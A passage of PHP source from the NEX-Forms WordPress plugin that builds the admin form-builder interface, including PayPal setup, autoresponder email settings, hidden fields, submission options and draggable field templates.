																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
						
					$output .= '</div>';
			
				
			$output .= ' </div>';
		$output .= ' </div>';
				 
				 
				 
				 
						
						/*$output .= '<div class="styling_options_inner">';
							if ( is_plugin_active( 'nex-forms-themes-add-on/main.php' ) ) {
									  
										
									$output .= '<div class="overall-form-settings">';
										$output .= '<div class="dropdown">
														  <small>Preset Themes:</small> <button class="btn btn-sm btn-primary dropdown-toggle" type="button" id="dropdownMenu1" data-toggle="dropdown" aria-expanded="true">
															<span class="current_selected_theme">1 - Default (bootstrap)</span>
															<span class="caret"></span>
														  </button>
														  
														   <ul class="dropdown-menu" role="menu" aria-labelledby="dropdownMenu1">';
														  
														  		$output .= '<li class="default"><a href="#">1 - Default (bootstrap)</a></li>';
																$output .= '<li class="black-tie"><a href="#">2 - black-tie</a></li>';
																$output .= '<li class="blitzer"><a href="#">3 - blitzer</a></li>';
																$output .= '<li class="cupertino"><a href="#">4 - cupertino</a></li>';
																$output .= '<li class="dark-hive"><a href="#">5 - dark-hive</a></li>';
																$output .= '<li class="dot-luv"><a href="#">6 - dot-luv</a></li>';
																$output .= '<li class="eggplant"><a href="#">7 - eggplant</a></li>';
																$output .= '<li class="excite-bike"><a href="#">8 - excite-bike</a></li>';
																$output .= '<li class="flick"><a href="#">9 - flick</a></li>';
																$output .= '<li class="hot-sneaks"><a href="#">10 - hot-sneaks</a></li>';
																$output .= '<li class="humanity"><a href="#">11 - humanity</a></li>';
																$output .= '<li class="le-frog"><a href="#">12 - le-frog</a></li>';
																$output .= '<li class="mint-choc"><a href="#">13 - mint-choc</a></li>';
																$output .= '<li class="overcast"><a href="#">14 - overcast</a></li>';
																$output .= '<li class="pepper-grinder"><a href="#">15 - pepper-grinder</a></li>';
																$output .= '<li class="redmond"><a href="#">16 - redmond</a></li>';
																$output .= '<li class="smoothness"><a href="#">17 - smoothness</a></li>';
																$output .= '<li class="south-street"><a href="#">18 - south-street</a></li>';
																$output .= '<li class="start"><a href="#">19 - start</a></li>';
																$output .= '<li class="sunny"><a href="#">20 - sunny</a></li>';
																$output .= '<li class="swanky-purse"><a href="#">21 - swanky-purse</a></li>';
																$output .= '<li class="trontastic"><a href="#">22 - trontastic</a></li>';
																$output .= '<li class="ui-darkness"><a href="#">23 - ui-darkness</a></li>';
																$output .= '<li class="ui-lightness"><a href="#">24 - ui-lightness</a></li>';
																$output .= '<li class="vader"><a href="#">25 - vader</a></li>';
														    
														  
															$output .= '
														  </ul>
														</div>';
									$output .= '</div>';
									}
									
									else
									{
									$output .= '<div class="overall-form-settings">';
										$output .= '<div class="dropdown">
														  <small>Preset Themes is  
														  <button type="button" class="btn btn-danger btn-xs get-add-on" data-container="body" data-toggle="popover" data-placement="bottom" data-html="true" title="<a href=\'http://codecanyon.net/user/Basix/portfolio?ref=Basix\' target=\'_blank\'>Themes Add-on</a>" data-content="When purchasing this usefull add-on you will be able to select between 25 preset themes (color schemes) to instantly change the overall look of your form. <br><br>This add-on will make it very easy to quickly and effectively fit a form&acute;s design to your theme&acute;s overall look and feel.<br><br><strong>Please feel free to test it before buy here in your admin panel </strong><em>(note that the styles will not reflect on your front-end without the purchased version active)</em><br /><br /> <a class=\'btn btn-success\' href=\'http://codecanyon.net/item/form-themes-for-nexforms/10037800ref=Basix\' target=\'_blank\'><span class=\'fa fa fa-thumbs-o-up\'></span>&nbsp;Get this add-on now</a>">
															 inactive&nbsp;&nbsp;&nbsp;<span class="caret"></span>
															</button><!--<a class="btn btn-xs btn-success" href="http://codecanyon.net/item/form-themes-for-nexforms/10037800ref=Basix" target="_blank" >Activate</a>--></small>&nbsp;&nbsp;<button class="btn btn-sm btn-primary dropdown-toggle" type="button" id="dropdownMenu1" data-toggle="dropdown" aria-expanded="true">
															<span class="current_selected_theme">1 - Default (bootstrap)</span>
															<span class="caret"></span>
														  </button>
														  
														   <ul class="dropdown-menu" role="menu" aria-labelledby="dropdownMenu1">';
														  
														  		$output .= '<li class="default"><a href="#">1 - Default (bootstrap)</a></li>';
																$output .= '<li class="black-tie"><a href="#">2 - black-tie</a></li>';
																$output .= '<li class="blitzer"><a href="#">3 - blitzer</a></li>';
																$output .= '<li class="cupertino"><a href="#">4 - cupertino</a></li>';
																$output .= '<li class="dark-hive"><a href="#">5 - dark-hive</a></li>';
																$output .= '<li class="dot-luv"><a href="#">6 - dot-luv</a></li>';
																$output .= '<li class="eggplant"><a href="#">7 - eggplant</a></li>';
																$output .= '<li class="excite-bike"><a href="#">8 - excite-bike</a></li>';
																$output .= '<li class="flick"><a href="#">9 - flick</a></li>';
																$output .= '<li class="hot-sneaks"><a href="#">10 - hot-sneaks</a></li>';
																$output .= '<li class="humanity"><a href="#">11 - humanity</a></li>';
																$output .= '<li class="le-frog"><a href="#">12 - le-frog</a></li>';
																$output .= '<li class="mint-choc"><a href="#">13 - mint-choc</a></li>';
																$output .= '<li class="overcast"><a href="#">14 - overcast</a></li>';
																$output .= '<li class="pepper-grinder"><a href="#">15 - pepper-grinder</a></li>';
																$output .= '<li class="redmond"><a href="#">16 - redmond</a></li>';
																$output .= '<li class="smoothness"><a href="#">17 - smoothness</a></li>';
																$output .= '<li class="south-street"><a href="#">18 - south-street</a></li>';
																$output .= '<li class="start"><a href="#">19 - start</a></li>';
																$output .= '<li class="sunny"><a href="#">20 - sunny</a></li>';
																$output .= '<li class="swanky-purse"><a href="#">21 - swanky-purse</a></li>';
																$output .= '<li class="trontastic"><a href="#">22 - trontastic</a></li>';
																$output .= '<li class="ui-darkness"><a href="#">23 - ui-darkness</a></li>';
																$output .= '<li class="ui-lightness"><a href="#">24 - ui-lightness</a></li>';
																$output .= '<li class="vader"><a href="#">25 - vader</a></li>';
														    
														  
															$output .= '
														  </ul>
														</div>';
									$output .= '</div>';	
									}
						$output .= '</div>';*/
					
					$output .= '</div>';
					
					/*
					



					
					*/
					
					
					$output .= '<div class="slide_in_paypal_setup slide_in_page">';
						$output .= '<div class="slide_in_page_holder">';
						$output .= '<a class="close_slide_in new_form"><span class="fa fa-close"></span></a>';
								
								$output .= '<div class="col-xs-12">';
														$output .= '<label>Go to PayPal?</label>';
														$output .= '<label class="settings" for="paypal_no"><input type="radio" name="is_paypal" value="no" id="paypal_no" checked="checked">&nbsp;No</label>';
														$output .= '<label class="settings" for="paypal_yes"><input type="radio" name="is_paypal" id="paypal_yes" value="yes" >&nbsp;Yes</label>';
														
													$output .= '</div>';
								
								$output .= '<div class="col-xs-12">';
														$output .= '<label>Environment</label>';
														$output .= '<label class="settings" for="sandbox"><input type="radio" name="paypal_environment" id="sandbox" value="sandbox" checked="checked">&nbsp;Sandbox</label>';
														$output .= '<label class="settings" for="live"><input type="radio" name="paypal_environment" value="live" id="live">&nbsp;Live</label>';
													$output .= '</div>';
								
								$output .= '<div class="col-sm-12">
											<div class="input-group-addon prefix">Business</div>
									   		<input class="form-control" name="business" value="" type="text" placeholder="Paypal Email address/ Paypal user ID" />
											</div>';
								
								$output .= '<div class="col-sm-12">
											<div class="input-group-addon prefix">Return URL</div>
									   		<input class="form-control" name="return" value="" type="text" placeholder="Leave blank to return back to the original form" />
											</div>';	
									
								$output .= '<div class="col-sm-12">
											<div class="input-group-addon prefix">Currency</div>
									   		<select name="currency_code">
												  <option value="USD" selected>--- Select ---</option>
												  <option value="AUD">Australian Dollar</option>
												  <option value="BRL">Brazilian Real</option>
												  <option value="CAD">Canadian Dollar</option>
												  <option value="CZK">Czech Koruna</option>
												  <option value="DKK">Danish Krone</option>
												  <option value="EUR">Euro</option>
												  <option value="HKD">Hong Kong Dollar</option>
												  <option value="HUF">Hungarian Forint </option>
												  <option value="ILS">Israeli New Sheqel</option>
												  <option value="JPY">Japanese Yen</option>
												  <option value="MYR">Malaysian Ringgit</option>
												  <option value="MXN">Mexican Peso</option>
												  <option value="NOK">Norwegian Krone</option>
												  <option value="NZD">New Zealand Dollar</option>
												  <option value="PHP">Philippine Peso</option>
												  <option value="PLN">Polish Zloty</option>
												  <option value="GBP">Pound Sterling</option>
												  <option value="SGD">Singapore Dollar</option>
												  <option value="SEK">Swedish Krona</option>
												  <option value="CHF">Swiss Franc</option>
												  <option value="TWD">Taiwan New Dollar</option>
												  <option value="THB">Thai Baht</option>
												  <option value="TRY">Turkish Lira</option>
												  <option value="USD">U.S. Dollar</option>
												</select>
											</div>';	
							$output .= '<div class="col-sm-12 language_select">
											<div class="input-group-addon prefix">Language</div>
									   		<select name="paypal_language_selection">
												<option value="US" selected> --- Select ---</option>
												<option value="AU">Australia</option>
												<option value="AT">Austria</option>
												<option value="BE">Belgium</option>
												<option value="BR">Brazil</option>
												<option value="CA">Canada</option>
												<option value="CH">Switzerland</option>
												<option value="CN">China</option>
												<option value="DE">Germany</option>
												<option value="ES">Spain</option>
												<option value="GB">United Kingdom</option>
												<option value="FR">France</option>
												<option value="IT">Italy</option>
												<option value="NL">Netherlands</option>
												<option value="PL">Poland</option>
												<option value="PT">Portugal</option>
												<option value="RU">Russia</option>
												<option value="US">United States</option>
												<option value="da_DK">Danish(for Denmark only)</option>
												<option value="he_IL">Hebrew (all)</option>
												<option value="id_ID">Indonesian (for Indonesia only)</option>
												<option value="ja_JP">Japanese (for Japan only)</option>
												<option value="no_NO">Norwegian (for Norway only)</option>
												<option value="pt_BR">Brazilian Portuguese (for Portugaland Brazil only)</option>
												<option value="ru_RU">Russian (for Lithuania, Latvia,and Ukraine only)</option>
												<option value="sv_SE">Swedish (for Sweden only)</option>
												<option value="th_TH">Thai (for Thailand only)</option>
												<option value="tr_TR">Turkish (for Turkey only)</option>
												<option value="zh_CN">Simplified Chinese (for China only)</option>
												<option value="zh_HK">Traditional Chinese (for Hong Kongonly)</option>
												<option value="zh_TW">Traditional Chinese (for Taiwanonly)</option>
											</select>
											</div>';																				
														
									
						$output .= '</div>';
					$output .= '</div>';
					
					
					
					$output .= '<div class="slide_in_paypal_product_setup slide_in_page">';
						$output .= '<div class="slide_in_page_holder">';
						$output .= '<a class="close_slide_in new_form"><span class="fa fa-close"></span></a>';
							
											$output .= '<div class="row">';
															$output .= '<div class="col-sm-12">';
																$output .= '<div class="btn btn-default add_paypal_product"><span class="fa fa-plus"></span>&nbsp;Add Item</div><br /><br />';
															$output .= '</div>';
														$output .= '</div>';
																												
														$output .= '<div class="row paypal_product_clone hidden">';
																$output .= '
																
																<div class="row">
  
  <div class="panel panel-default">
  <div class="panel-heading"><span class="product_number">Item 1</span><div class="btn btn-default btn-sm remove_paypal_product"><span class="fa fa-trash-o"></span></div></div>
<div class="panel-body"><input style="width:100% !important" placeholder="Item Name" name="item_name" class="form-control">

  <br><div class="pp_product_quantity">
  <label class="pp_product_label">Quantity</label>
  
  <div class="btn btn-sm btn-default static_value active">Static Value</div>
  <div class="btn btn-sm btn-default field_value">Map Field</div>
	  <input type="hidden" name="set_quantity" value="static">
	  <input  type="text" style="width:100% !important" placeholder="Quantity" name="item_quantity" class="form-control">
	  <select name="map_item_quantity" class="form-control hidden"><option value="0">--- Map Field ---</option></select>
 
  </div>
	
	<br><div class="pp_product_amount">
  <label class="pp_product_amount">Amount</label>
  
  <div class="btn btn-sm btn-default static_value active">Static Value</div>
  <div class="btn btn-sm btn-default field_value">Map Field</div>
	  <input type="hidden" name="set_amount" value="static">
	  <input type="text" style="width:100% !important" placeholder="Amount" name="item_amount" class="form-control">
	  <select name="map_item_amount" class="form-control hidden"><option value="0">--- Map Field ---</option></select>
 
  </div>
	
	
		</div>
	</div>
</div>
																
																';
														$output .= '</div>';
														
														$output .= '<div class="paypal_products"></div>';
									
						$output .= '</div>';
					$output .= '</div>';
					
					
					$output .= '<div class="slide_in_logic slide_in_right"><h4 class="left_slide_heading">Conditional Logic</h4>';
					$output .= '<a class="close_slide_in_right new_form"><span class="fa fa-close"></span></a>';
						
						$output .= '</div>';
					
					$output .= '<div class="slide_in_autoresponder_settings slide_in_page">';
						$output .= '<div class="slide_in_page_holder">';
						$output .= '<a class="close_slide_in new_form"><span class="fa fa-close"></span></a>';
							$output .= '<div class="row">
											
									<div class="col-sm-12">
										<div class="input-group-addon prefix">From Adrress</div>
											
												<input data-tag-class="label-info" id="nex_autoresponder_from_address" type="text" name="from_address"  value="'.get_option('admin_email').'" class="form-control  input-sm">
											
									</div>
									<div class="col-sm-12">
										<div class="input-group ">
											</div>
											<div class="input-group-addon prefix">From Name</div>
												<input data-tag-class="label-info" id="nex_autoresponder_from_name" type="text" name="from_name"  value="'.get_option('blogname').'" class="form-control input-sm">
											
											
									</div>
									<div class="col-sm-12">
										<div class="input-group-addon prefix">Subject</div>
											
												<input data-tag-class="label-info" id="nex_autoresponder_confirmation_mail_subject" type="text" name="confirmation_mail_subject"  value="'.get_option('blogname').' NEX-Forms submission" class="form-control input-sm">
											
											
										</div>
								  </div>';
						$output .= '</div>';
					$output .= '</div>';
					
					
					
					$output .= '<div class="slide_in_autoresponder_admin_email slide_in_page">';
						$output .= '<div class="slide_in_page_holder">';
						$output .= '<a class="close_slide_in new_form"><span class="fa fa-close"></span></a>';
							$output .= '<div class="row">
											<div class="col-sm-12">
											<div class="input-group-addon prefix">Recipients</div>
									   		<input data-tag-class="label-info" id="nex_autoresponder_recipients" type="text" placeholder="email@domian.com, email2@domian.com" name="recipients"  value="'.get_option('admin_email').'" class="form-control input-sm">
											</div>
											<div class="col-sm-12">
											<div class="input-group-addon prefix">BCC</div>
									   		<input data-tag-class="label-info" id="nex_admin_bcc_recipients" placeholder="email@domian.com, email2@domian.com" type="text" name="recipients"  value="" class="form-control input-sm">
											</div>
											
									
									<div class="col-sm-12">
										<div class="show_current_fields">
											<div class="input-group-addon make_full_width">Current Fields</div>
												<div class="data_select">
													<div class="form_data active">Form Data</div>
													<div class="server_data">Server Data</div>
												</div>
												<div class="available_server_data field_place_holders" style="display:none;"><div class="input_name">All Form Data</div><div class="input_placeholder"><input type="text" name="get_place_holder_value" value="{{nf_form_data}}"></div><div class="input_name">User IP</div><div class="input_placeholder"><input type="text" name="get_place_holder_value" value="{{nf_user_ip}}"></div><div class="input_name">User Name</div><div class="input_placeholder"><input type="text" name="get_place_holder_value" value="{{nf_user_name}}"></div><div class="input_name">Form Title</div><div class="input_placeholder"><input type="text" name="get_place_holder_value" value="{{nf_form_title}}"></div><div class="input_name">From Page</div><div class="input_placeholder"><input type="text" name="get_place_holder_value" value="{{nf_from_page}}"></div></div>
												<div class="available_fields_holder field_place_holders"></div>
									   		<!--<select multiple="multiple" name="current_fields" class="form-control">
											</select>-->
										</div>
										<div class="message_body">
											<div class="input-group-addon make_full_width">Message Body</div>
									   		<textarea id="nex_autoresponder_admin_mail_body" name="confirmation_mail_body" class="form-control">Thank you for connecting with us. We will respond to you shortly.</textarea>
										</div>
									</div>
								  </div>';
						$output .= '</div>';
					$output .= '</div>';
					
					
					$output .= '<div class="slide_in_autoresponder_user_email slide_in_page">';
						$output .= '<div class="slide_in_page_holder">';
						$output .= '<a class="close_slide_in new_form"><span class="fa fa-close"></span></a>';
							$output .= '<div class="row">
											<div class="col-sm-12  no-email hidden">
												<span class="fa fa-warning"></span><span class="text-danger">You do not have any fields set to be validated as email format. Please add a field and set it to be validated as email format and it will be available to map it in the list below.</span>
											</div>
											<div class="col-sm-12">
											<div class="input-group-addon prefix">Recipients</div>
									   		
											
													
													<select name="posible_email_fields" id="nex_autoresponder_user_email_field" class="form-control"></select>
											
											</div>
											<div class="col-sm-12">
											<div class="input-group-addon prefix">BCC</div>
									   		<input data-tag-class="label-info" id="nex_autoresponder_bcc_recipients" placeholder="email@domian.com, email2@domian.com" type="text" name="recipients"  value="" class="form-control input-sm">
											</div>
											
									
									<div class="col-sm-12">
										<div class="show_current_fields">
											<div class="input-group-addon make_full_width">Current Fields</div>
												<div class="data_select">
													<div class="form_data active">Form Data</div>
													<div class="server_data">Server Data</div>
												</div>
												<div class="available_server_data field_place_holders" style="display:none;"><div class="input_name">All Form Data</div><div class="input_placeholder"><input type="text" name="get_place_holder_value" value="{{nf_form_data}}"></div><div class="input_name">User IP</div><div class="input_placeholder"><input type="text" name="get_place_holder_value" value="{{nf_user_ip}}"></div><div class="input_name">User Name</div><div class="input_placeholder"><input type="text" name="get_place_holder_value" value="{{nf_user_name}}"></div><div class="input_name">Sent Date</div><div class="input_placeholder"><input type="text" name="get_place_holder_value" value="{{nf_sent_date}}"></div><div class="input_name">Form Name</div><div class="input_placeholder"><input type="text" name="get_place_holder_value" value="{{nf_form_name}}"></div><div class="input_name">From Page</div><div class="input_placeholder"><input type="text" name="get_place_holder_value" value="{{nf_from_page}}"></div></div>
												<div class="available_fields_holder field_place_holders"></div>
									   		<!--<select multiple="multiple" name="current_fields" class="form-control">
											</select>-->
										</div>
										<div class="message_body">
											<div class="input-group-addon make_full_width">Message Body</div>
									   		<textarea id="nex_autoresponder_confirmation_mail_body" name="confirmation_mail_body" class="form-control">Thank you for connecting with us. We will respond to you shortly.</textarea>
										</div>
									</div>
								  </div>';
						$output .= '</div>';
					$output .= '</div>';
					
					
					
					$output .= '<div class="slide_in_form_hidden_fields slide_in_page">';
						$output .= '<div class="slide_in_page_holder">';
						$output .= '<a class="close_slide_in new_form"><span class="fa fa-close"></span></a>';
							
											$output .= '<div class="row">';
															$output .= '<div class="col-sm-12">';
																$output .= '<div class="btn btn-default add_hidden_field"><span class="fa fa-plus"></span>&nbsp;Add hidden Field</div><br /><br />';
															$output .= '</div>';
														$output .= '</div>';
																												
														$output .= '<div class="row hidden_field_clone hidden">';
																$output .= '<input type="text" class="form-control field_name hidden_field_name" value="" placeholder="Field Name">';
																$output .= '<input type="text" class="form-control field_value hidden_field_value" value="" placeholder="Field Value">';
																$output .= '<div class="btn btn-default btn-sm remove_hidden_field"><span class="fa fa-trash-o"></span></div>';
														$output .= '</div>';
														
														$output .= '<div class="hidden_fields"></div>';
									
						$output .= '</div>';
					$output .= '</div>';
					
					
					$output .= '<div class="slide_in_on_submit slide_in_page">';
						$output .= '<div class="slide_in_page_holder">';
						$output .= '<a class="close_slide_in new_form"><span class="fa fa-close"></span></a>';
							
											$output .= '<div class="row">';
													$output .= '<div class="col-xs-12">';
														$output .= '<label>Post Action</label>';
														$output .= '<label class="settings" for="ajax"><input type="radio" name="post_action" id="ajax" value="ajax" checked="checked">&nbsp;Ajax</label>';
														$output .= '<label class="settings" for="custom"><input type="radio" name="post_action" value="custom" id="custom">&nbsp;Custom</label>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="row ajax_posting hidden">';
												
													$output .= '<div class="col-xs-12">';
														$output .= '<label>On Submit</label>';
														$output .= '<label class="settings"  for="on_form_submission_message"><input type="radio" name="on_form_submission" id="on_form_submission_message" value="message" checked="checked">&nbsp;Show message</label>';
														$output .= '<label class="settings" for="on_form_submission_redirect"><input type="radio" name="on_form_submission" value="redirect" id="on_form_submission_redirect">&nbsp;Redirect to URL</label>';
													$output .= '</div>';										
												
													$output .= '<div class="confirmation_message">';
														$output .= '<div class="col-xs-12">';
															//$output .= '<label>Show confirmation message</label>';
															$output .= '<textarea id="nex_autoresponder_on_screen_confirmation_message" name="on_screen_confirmation_message" class="form-control">Thank you for connecting with us.</textarea>';
														$output .= '</div>';
													$output .= '</div>';
													
													$output .= '<div class="redirect_to_url hidden">';
														$output .= '<div class="col-xs-12">';
															//$output .= '<label>Redirect To URL</label>';
															$output .= '<input data-tag-class="label-info" id="nex_autoresponder_confirmation_page" type="text" name="confirmation_page" Placeholder="Enter URL"  value="" class="form-control">';
														$output .= '</div>';
													$output .= '</div>';
													
													/*$output .= '<div class="col-xs-12">';
														$output .= '<label>Google Analytics Conversion Code</label>';
														$output .= '<textarea id="google_analytics_conversion_code" name="google_analytics_conversion_code" class="form-control"></textarea>';
													$output .= '</div>';*/
													
												$output .= '</div>';
												
												
												$output .= '<div class="row custom_posting hidden">';
													$output .= '<div class="col-xs-12">';
														//$output .= '<label>Enter Custom URL for form action</label>';
														$output .= '<label>Post Method</label>';
														$output .= '<label class="settings" for="post_method"><input type="radio" name="post_type" id="post_method" value="POST" checked="checked">&nbsp;POST</label>';
														$output .= '<label class="settings" for="get_method"><input type="radio" name="post_type" value="GET" id="get_method">&nbsp;GET</label>';
														$output .= '<input data-tag-class="label-info" id="on_form_submission_custum_url" Placeholder="Enter Custom URL" type="text" name="custum_url"  value="" class="form-control">';
														
													$output .= '</div>';
												$output .= '</div>';
									
						$output .= '</div>';
					$output .= '</div>';
					
					
					
					$output .= '<div class="form_entries_slide_in slide_in_page">';
						$output .= '<div class="slide_in_page_holder">';
						$output .= '<a class="close_slide_in new_form"><span class="fa fa-close"></span></a>';
							
									$output .= '<div class="nex-forms-entries">';
									
									$config 	= new NEXForms_Config();
	

									$config->plugin_name 		= 'nex_forms_entries';
									$config->plugin_alias		= 'nex_forms_entries';
									$config->plugin_table		= $config->plugin_prefix.'nex_forms_entries';
									$config->component_table	= 'nex_forms_entries';
									
									
									$template 	= new IZC_Template();
									//$template->build_landing_page($config);
									$output .= $template->build_landing_page($config);
									 
									 			  
									$output .= '</div>';
						$output .= '</div>';
						$output .= '<div class="scroll_spacer"></div>';
					$output .= '</div>';
					
					
					
					$output .= '<div class="saved_forms_container slide_in_container">';
						$output .= '<a class="close_slide_in open_forms"><span class="fa fa-close"></span></a><div style="clear:both; border-bottom:1px solid #ddd;"></div>';
						$output .= '<div class="saved_forms form_holder">';
							$output .= '<div class="loading"><i class="fa fa-circle-o-notch fa-spin"></i></div>';
						$output .= '</div>';
					$output .= '</div>';
				
					$output .= '<div class="new_form_container slide_in_container">';
						$output .= '<a class="close_slide_in new_form"><span class="fa fa-close"></span></a><div style="clear:both; border-bottom:1px solid #ddd;"></div>';
						$output .= '<div class="form_templates form_holder">';
							$output .= '<a id="blank_form" href="#" class="list-group-item"><span class="fa fa-file-o"></span>&nbsp;&nbsp;Blank</a>
							<a id="import_form" href="#" class="list-group-item"><span class="fa fa-cloud-upload"></span>&nbsp;&nbsp;Import Form</a>
							
							
							
							
							
							<div class="template_forms"><div class="loading"><i class="fa fa-circle-o-notch fa-spin"></i></div></div>';
						$output .= '</div>';
					$output .= '</div>';
			
				
					$output .= '<div class="paypal_options slide_in_container">';
						
						$output .= '<div class="form_holder">';
							$output .= '<a id="paypal_setup" href="#" class="list-group-item "><span class="fa fa-paypal"></span>&nbsp;&nbsp;PayPal Setup</a>';
							$output .= '<a id="paypal_products_setup" href="#" class="list-group-item active"><span class="fa fa-shopping-cart"></span>&nbsp;&nbsp;Items Setup</a>';
							
						$output .= '</div>';
					$output .= '</div>';
					
			
					$output .= '<div class="auto_responder_settings slide_in_container">';
						
						$output .= '<div class="auto_responder_setup form_holder">';
							$output .= '<a id="message_attr" href="#" class="list-group-item active"><span class="fa fa-user"></span>&nbsp;&nbsp;Email Attributes</a>';
							$output .= '<a id="admin_setup" href="#" class="list-group-item"><span class="fa fa-envelope"></span>&nbsp;&nbsp;Admin Email</a>';
							$output .= '<a id="autoresponder_setup" href="#" class="list-group-item"><span class="fa fa-envelope-o"></span>&nbsp;&nbsp;User Email</a>';
						$output .= '</div>';
					$output .= '</div>';
					
					
					
					$output .= '<div class="form_options slide_in_container">';
						
						$output .= '<div class="form_holder">';
							
							$output .= '<a id="on_form_submit" href="#" class="list-group-item"><span class="fa fa-check"></span>&nbsp;&nbsp;On Submission</a>';
							$output .= '<a id="hidden_fields" href="#" class="list-group-item active"><span class="fa fa-eye-slash"></span>&nbsp;&nbsp;Hidden Fields</a>';
						$output .= '</div>';
					$output .= '</div>';
					
					
					$output .= '<div class="global_settings_menu slide_in_container">';
						
						$output .= '<div class="form_holder">';
							
							$output .= '<a id="email_config" href="#" class="list-group-item"><span class="fa fa-check"></span>&nbsp;&nbsp;Mailing Configuration</a>';
							$output .= '<a id="js_inclusion" href="#" class="list-group-item active"><span class="fa fa-eye-slash"></span>&nbsp;&nbsp;JS Inclusion</a>';
							$output .= '<a id="css_inclusion" href="#" class="list-group-item active"><span class="fa fa-eye-slash"></span>&nbsp;&nbsp;CSS Inclusion</a>';
							$output .= '<a id="other_gloabal_settings" href="#" class="list-group-item active"><span class="fa fa-eye-slash"></span>&nbsp;&nbsp;Misc</a>';
						$output .= '</div>';
						
					$output .= '</div>';
					
					
					
					
					
					$output .= '<div class="colleft">';
					
						
					
						$output .= '<div class="col1 bootstro" data-bootstro-title="Form Elements" data-bootstro-content="Find all you need to create forms in this menu. Simply click or drag an element from here to the open space on the right." data-bootstro-placement="right" data-bootstro-step="7">';
							
						$output .= '<div class="clonable">';
					
					
						
/****************************************************/	
/****************************************************/
/*******************DROPPABLES **********************/	
/****************************************************/
/****************************************************/					
								
						
				$output .= '<div class="panel-group" id="fields_accordion" role="tablist" aria-multiselectable="false">';
				


			
			
					
/****************************************************/	
/**COMMON FIELDS ************************************/	
/****************************************************/	
					$output .= '<div class="panel panel-default">';
						$output .= '<div class="panel-heading" role="tab" id="headingOne">';
							$output .= '<h4 class="panel-title">';
								$output .= '<a class="" role="button" data-toggle="collapse" data-parent="#fields_accordion" href="#collapseOne" aria-expanded="true" aria-controls="collapseOne">';
									$output .= '<span class="fa fa-star"></span>&nbsp;Form Fields';
								$output .= '</a>';
							$output .= '</h4>';
						$output .= '</div>';
						$output .= '<div id="collapseOne" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="headingOne">';
							$output .= '<div class="panel-body">';
							
	
	//ICON FIELD
								$output .= '<div class="field form_field custom-prefix common-fields" >';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class="fa fa-smile-o"></i>&nbsp;&nbsp;<span class="field_title">Icon Field</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Icon Field</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1"><div class="svg_ready">';
																$output .= '<div class="input-group date">';
																$output .= '<span class="input-group-addon prefix "><span class=""></span></span>';
																$output .= '<input type="text" name="icon_field" class="error_message  form-control the_input_element " data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" title="" data-secondary-message=""/>';
																$output .= '</div></div>';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													$output .= '</div>';
												
												
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
							

							
//////////TEXT FIELD
								$output .= '<div class="field form_field common-fields text">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class=" glyphicon glyphicon-minus"></i>&nbsp;&nbsp;<span class="field_title">Text Field</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
													$output .= '<div class="row ">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Text Field</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																		$output .= '<input id="ve_text" type="text" name="text_field" placeholder="" data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" maxlength="200" class="error_message svg_ready the_input_element text pre-format form-control" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" data-secondary-message="" title="">';
																		$output .= '<span class="help-block hidden">Help text...</span>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';
															$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
